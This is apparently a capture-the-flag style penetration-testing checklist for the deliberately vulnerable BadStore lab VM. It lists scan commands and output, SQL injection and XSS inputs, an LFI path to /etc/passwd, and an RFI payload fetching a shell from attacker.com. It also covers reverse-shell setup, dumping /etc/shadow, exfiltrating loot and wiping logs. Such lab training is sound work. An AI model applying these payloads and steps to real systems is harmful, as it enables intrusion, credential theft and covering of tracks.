
---

### 🔍 **Pre-Engagement Setup**

-  [x] Configure VM in isolated network 
-  [x] Run `netdiscover` or `arp-scan` to identify target IP
-  [x] Confirm connectivity with `ping <IP>`

---

### 🧭 **Enumeration**

#### 🔹 Network Scanning (Nmap)

-  [x] `nmap -sS -A -T4 <IP>` – identify open ports and services

```bash
sudo nmap -sS -sV -O -A -p- -T4 0.0.0.0
```

-  [x] Check for common web ports: 80, 443, 8080, etc.

```
# there is a open ports 
# HTTP  - 80
# HTTPS - 443
# MySQL - 3306
```
#### 🔹 Service Enumeration

- [x] Check service banners (Apache, version, etc.)

```bash
# port 80 Apache httpd 1.3.28 ((Unix) mod_ssl/2.8.15 OpenSSL/0.9.7c)
# port 443 ssl/https Apache/1.3.28 (Unix) mod_ssl/2.8.15 OpenSSL/0.9.7c
# port 3306 MySQL 4.1.7-standard
```

- [x] Look for outdated services    

```bash
# All service outdated
```

#### 🔹 Web Enumeration

-  [x] Browse to the website (`http://<IP>`)

```bash
curl http://0.0.0.0
```

-  [x] Identify CMS or application type (BadStore)

```bash
curl -I http://0.0.0.0
# Server: Apache/1.3.28 (Unix) mod_ssl/2.8.15 OpenSSL/0.9.7c
```

-  [ ] Use `whatweb`, `nikto`, or `dirb/dirbuster` for hidden directories and files

```bash
dirb http://0.0.0.0 -w
```

```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug  3 12:43:53 2025
URL_BASE: http://192.168.68.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.68.103/ ----
==> DIRECTORY: http://192.168.68.103/backup/                                                                       
+ http://192.168.68.103/cgi-bin/ (CODE:403|SIZE:277)                                                               
+ http://192.168.68.103/favicon.ico (CODE:200|SIZE:1334)                                                           
==> DIRECTORY: http://192.168.68.103/images/                                                                       
+ http://192.168.68.103/index (CODE:200|SIZE:3583)                                                                 
+ http://192.168.68.103/index.html (CODE:200|SIZE:3583)                                                            
+ http://192.168.68.103/robots (CODE:200|SIZE:316)                                                                 
+ http://192.168.68.103/robots.txt (CODE:200|SIZE:316)                                                             
==> DIRECTORY: http://192.168.68.103/supplier/                                                                     
                                                                                                                   
---- Entering directory: http://192.168.68.103/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                   
---- Entering directory: http://192.168.68.103/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
+ http://192.168.68.103/images/1000 (CODE:200|SIZE:2804)                                                           
+ http://192.168.68.103/images/1001 (CODE:200|SIZE:2808)                                                           
+ http://192.168.68.103/images/cart (CODE:200|SIZE:607)                                            
+ http://192.168.68.103/images/index (CODE:200|SIZE:268)                                                                                            
---- Entering directory: http://192.168.68.103/supplier/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
+ http://192.168.68.103/supplier/accounts (CODE:200|SIZE:215)                                                      
                                                                                                                   
-----------------
END_TIME: Sun Aug  3 12:44:11 2025
DOWNLOADED: 18448 - FOUND: 11

```

-  [ ] Use `gobuster` or `ffuf` for fuzzing directories

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -u http://0.0.0.0/FUZZ -c
```

---

### 🧪 **Vulnerability Identification**

#### 🔹 Web Vulnerabilities

-  [x] Try **SQL Injection** (search boxes, login forms, etc.)    

```bash
# Register for a New account
# Full Name:
# enter this: 1=1'--
```

-  [x] Test for **XSS** (reflected or stored)

```bash
# Register for a New account
# Full Name:
# enter this: <script>alert(1)</script>
```

-  [ ] Attempt **Command Injection**

```bash

```

-  [ ] Analyze JavaScript for hidden data or functions
-  [ ] Look for hardcoded credentials
-  [ ] Try default creds: `admin/admin`, `test/test`, `admin/password`

#### 🔹 File Upload / LFI / RFI

-  Test file upload if available – check for:
    -  Lack of file type restrictions
    -  Location where uploaded file is stored
-  Try LFI: `page=../../../../etc/passwd`
-  Try RFI: `page=http://attacker.com/shell.txt`    

---

### 🧱 **Gain Initial Access**

-  Exploit vulnerable login (SQLi, weak creds, etc.)    
-  Upload web shell (`php-reverse-shell`, `c99`, etc.)
-  Set up listener: `nc -lvnp <port>`
-  Execute reverse shell

---

### 🧗 **Privilege Escalation**

#### 🔹 Basic Enumeration

-  `uname -a`    
-  `id`, `whoami`
-  `sudo -l`
-  Check for SUID/SGID files: `find / -perm -4000 -type f 2>/dev/null`
-  Look for writable files in `/etc`

#### 🔹 Password Hunting

-  Check home directories
-  Check `.bash_history`, `.mysql_history`, `.ssh/`
-  Look for config files with creds: `config.php`, `wp-config.php`, etc.

#### 🔹 Exploitable Binaries / Cron Jobs

-  Look in `/etc/crontab`, `/etc/cron.*`
-  Look for misconfigured scripts run by root

#### 🔹 Kernel Exploits

-  Identify kernel version: `uname -r`
-  Search for matching local exploits (e.g., Dirty COW)

---

### 📦 **Post-Exploitation**

-  Dump `/etc/shadow`    
-  Try cracking hashes using `john` or `hashcat`
-  Exfiltrate loot: passwords, database dumps, config files
-  Enumerate internal network (if any)

---

### 🧹 **Clean Up**

-  Remove any shells, uploaded files, logs (if required)
-  Close any listeners or payloads

---

### 📝 **Flag / Goal (If applicable)**

-  Locate the flag (often in `/root` or `/home/user`)    
-  Submit the flag as required

---
